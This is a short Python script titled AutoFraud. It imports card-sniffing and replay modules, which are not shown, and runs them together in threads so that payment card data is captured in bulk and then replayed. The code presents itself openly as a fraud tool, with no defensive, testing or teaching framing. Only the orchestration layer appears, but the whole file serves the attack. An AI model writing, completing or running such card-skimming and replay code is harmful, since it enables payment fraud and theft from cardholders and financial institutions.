import threading
import time
from mass_card_sniffer import MassCardSniffer
from mass_replay import MassReplayer

class AutoFraud:
	def __init__(self):
		self.sniffer = MassCardSniffer()
		self.replayer = MassReplayer()

	def run(self):
		"""Runs both sniffing & replay in an infinite loop"""
		sniff_thread = threading.Thread(target=self.sniffer.start_sniffing)
		replay_thread = threading.Thread(target=self.replayer.replay_all, args=(5,))

		sniff_thread.start()
		time.sleep(10)  # Let sniffing start before replaying
		replay_thread.start()

		sniff_thread.join()
		replay_thread.join()

if __name__ == "__main__":
	fraud = AutoFraud()
	fraud.run()
